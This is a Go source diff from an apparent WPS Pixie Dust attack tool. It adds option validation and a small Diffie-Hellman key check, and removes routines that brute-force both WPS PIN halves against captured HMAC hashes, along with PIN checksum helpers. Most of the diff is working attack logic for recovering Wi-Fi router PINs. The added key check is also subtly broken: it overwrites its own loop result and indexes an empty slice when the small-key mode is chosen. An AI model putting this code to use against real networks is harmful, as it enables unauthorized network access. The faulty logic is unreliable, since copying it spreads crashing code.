@@ -81,8 +81,40 @@ func newPixieDust(args []string) pixieDustAttack {
 
 func (pda *pixieDustAttack) execute() {
 	pda.timeExec = time.Now()
-    pda.executeRTL819xCase()
+    pda.executeRTL819xCase() // if executed, it will stop here
+    pda.validDHSmallFlag()
+    pda.checkSmallDHKeys()
     pda.displayTime()
+}
+
+
+
+func (pda *pixieDustAttack) validDHSmallFlag() {
+    if pda.dhSmall && pda.pkr != nil {
+        utils.Abort("Options -S/--dhsmall and -r/--pkr are mutually exclusive")
+    }
+
+    if !pda.dhSmall && pda.pkr == nil {
+        utils.Abort("Either -S/--dhsmall or -r/--pkr must be specified")
+    }
+}
+
+
+
+func (pda *pixieDustAttack) checkSmallDHKeys() {
+    lenPkr := len(pda.pkr)
+
+    if lenPkr != wpsPkeyLen {
+        pda.dhSmall = false
+    }
+
+    for i := 0; i < lenPkr - 1; i++ {
+        if pda.pkr[i] != 0 {
+            pda.dhSmall = false
+        }
+    }
+
+    pda.dhSmall = pda.pkr[lenPkr - 1] == 0x02
 }
 
 
@@ -163,141 +195,6 @@ func (pda *pixieDustAttack) keyDerivationFunction() {
 func (pda *pixieDustAttack) emptyPinHMAC() {
     h := hmac.New(sha256.New, pda.authKey)
     pda.emptyPsk = h.Sum(nil)
-}
-
-
-
-func (pda *pixieDustAttack) crackFirstHalf(es1Override []byte) {
-    eS1 := utils.Pick(es1Override != nil, es1Override, pda.eSecret1)
-
-    if pda.checkEmptyPinHalf(eS1, pda.eHash1) {
-        pda.emptyPin  = true
-        pda.firstHalf = 0
-        pda.psk1      = make([]byte, len(pda.emptyPsk))
-        copy(pda.psk1, pda.emptyPsk)
-        return
-    }
-
-    for firstHalf := range 10000 {
-        psk, ok := pda.checkPinHalf(eS1, pda.eHash1, firstHalf)
-        
-        if ok {
-            pda.firstHalf = firstHalf
-            pda.psk1      = append([]byte(nil), psk...)
-            return
-        }
-    }
-
-    pda.firstHalf = -1
-}
-
-
-
-func (pda *pixieDustAttack) checkEmptyPinHalf(es, ehash []byte) bool {
-    h := hmac.New(sha256.New, pda.authKey)
-    h.Write(es)
-    h.Write(pda.emptyPsk[:16])
-    h.Write(pda.pke)
-    h.Write(pda.pkr)
-    hash := h.Sum(nil)
-    return hmac.Equal(hash, ehash)
-}
-
-
-
-func (pda *pixieDustAttack) checkPinHalf(es, ehash []byte, pinHalf int) ([]byte, bool) {
-    h       := hmac.New(sha256.New, pda.authKey)
-    pinhalf := intToPinHalf(pinHalf)
-    h.Write(pinhalf[:])
-    psk := h.Sum(nil)[:16]
-
-    // buffer = es || psk || pke || pkr
-    h.Reset()
-    h.Write(es)
-    h.Write(psk)
-    h.Write(pda.pke)
-    h.Write(pda.pkr)
-    hash := h.Sum(nil)
-
-    return psk, hmac.Equal(hash, ehash)
-}
-
-
-
-func intToPinHalf(n int) [4]byte {
-    var buf [4]byte
-    buf[0] = byte('0' + (n/1000)%10)
-    buf[1] = byte('0' + (n/100)%10)
-    buf[2] = byte('0' + (n/10)%10)
-    buf[3] = byte('0' + n%10)
-    return buf
-}
-
-
-
-func (pda *pixieDustAttack) crackSecondHalf() {
-    if pda.emptyPin {
-        if pda.checkEmptyPinHalf(pda.eSecret2, pda.eHash2) {
-            pda.secondHalf = 0
-            pda.psk2       = make([]byte, len(pda.emptyPsk))
-            copy(pda.psk2, pda.emptyPsk)
-            return
-        }
-        utils.Abort("Empty pin not valid for second half")
-    }
-
-    if pda.firstHalf < 0 || pda.firstHalf > 9999 {
-        utils.Abort(fmt.Sprintf("Invalid first half: %d", pda.firstHalf))
-    }
-
-    for secondHalf := range 1000{
-        checksum    := wpsPinChecksum(pda.firstHalf * 1000 + secondHalf)
-        cSecondHalf := secondHalf * 10 + checksum
-        psk, ok     := pda.checkPinHalf(pda.eSecret2, pda.eHash2, cSecondHalf)
-
-        if ok {
-            pda.secondHalf = cSecondHalf
-            pda.psk2       = make([]byte, len(psk))
-            copy(pda.psk2, psk)
-            return
-        }
-    }
-
-    // Fallback
-    for secondHalf := range 10000 {
-        pinFull := pda.firstHalf * 10000 + secondHalf
-        if wpsPinValid(pinFull) { continue }
-
-        psk, ok := pda.checkPinHalf(pda.eSecret2, pda.eHash2, secondHalf)
-
-        if ok {
-            pda.secondHalf = secondHalf
-            pda.psk2       = make([]byte, len(psk))
-            copy(pda.psk2, psk)
-            return
-        }
-    }
-
-    pda.secondHalf = -1
-}
-
-
-
-func wpsPinChecksum(pin int) int {
-    acc := 0
-    for pin > 0 {
-        acc += 3 * (pin % 10)
-        pin /= 10
-        acc += pin % 10
-        pin /= 10
-    }
-    return (10 - acc%10) % 10
-}
-
-
-
-func wpsPinValid(pin int) bool {
-    return wpsPinChecksum(pin/10) == pin % 10
 }
 
 
